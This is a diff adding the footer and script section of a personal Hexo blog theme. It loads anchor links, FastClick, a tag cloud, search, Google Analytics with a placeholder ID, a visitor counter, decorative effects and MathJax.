+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+
+
+<style  type="text/css">
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/flepeng">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy;
+                    <a href="https://beian.miit.gov.cn/" target="_blank" rel="noopener">京ICP备18055501号-2</a>;
+                    Feng Lepeng 2024
+                    <br>
+                    Powered by 
+                    <a href="https://github.com/dusign/hexo-theme-snail" target="_blank" rel="noopener">
+                        <i>hexo-theme-snail</i>
+                    </a> | 
+                    <iframe name="star" style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0"
+                        width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=flepeng&repo=hexo-theme-lp&type=star">
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- Search -->
+
+<script src="/js/search.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://flepeng.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-XXXXXXXX-X';
+    var _gaDomain = 'yoursite';
+
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script>
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Search -->
+
+    <script type="text/javascript">      
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+            search_path = "search.xml";
+        }
+    var path = "/" + search_path;
+    searchFunc(path, 'local-search-input', 'local-search-result');
+    </script>
+
+
+<!-- busuanzi -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+
+    
+        <!-- background effects line -->
+        
+
+        
+            <script type="text/javascript" src="/js/mouse-click.js" content='[&quot;🌱&quot;,&quot;just do it&quot;,&quot;🍀&quot;]' color='[&quot;rgb(121,93,179)&quot; ,&quot;rgb(76,180,231)&quot; ,&quot;rgb(184,90,154)&quot;]'></script>
+        
+
+        <!-- background effects end -->
+    
+
+    <!--<script size="50" alpha='0.3' zIndex="-999" src="/js/ribbonStatic.js"></script>-->
+    
+        <script src="/js/ribbonDynamic.js"></script>
+    
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+
+</html>
